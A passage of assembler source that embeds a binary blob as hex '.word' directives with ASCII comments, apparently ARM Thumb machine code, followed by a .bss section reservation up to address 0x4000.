    .word  0x29001C02    /* 24D0: ...) */
    .word  0x210FD001    /* 24D4: ...! */
    .word  0x465EB5F0    /* 24D8: ..^F */
    .word  0x46444655    /* 24DC: UFDF */
    .word  0xAF06B470    /* 24E0: p... */
    .word  0x9201B082    /* 24E4: .... */
    .word  0x4D70E92D    /* 24E8: -.pM */
    .word  0x9102B08B    /* 24EC: .... */
    .word  0x465EB5F0    /* 24F0: ..^F */
    .word  0x46444655    /* 24F4: UFDF */
    .word  0xAF06B470    /* 24F8: p... */
    .word  0x1C04B08C    /* 24FC: .... */
    .word  0x4FF1D5DD    /* 2500: ...O */
    .word  0x23E0F404    /* 2504: ...# */
    .word  0x4692468B    /* 2508: .F.F */
    .word  0x14189EFF    /* 250C: .... */
    .word  0x0F5B036B    /* 2510: k.[. */
    .word  0x468B900F    /* 2514: ...F */
    .word  0x2B004692    /* 2518: .F.+ */
    .word  0x00000000    /* 251C: .... */

/* payload end @ 0x2520; runtime BSS continues to 0x4000 */
.section .bss
.align 4
g_bss:
    .space 0x4000 - 0x2520

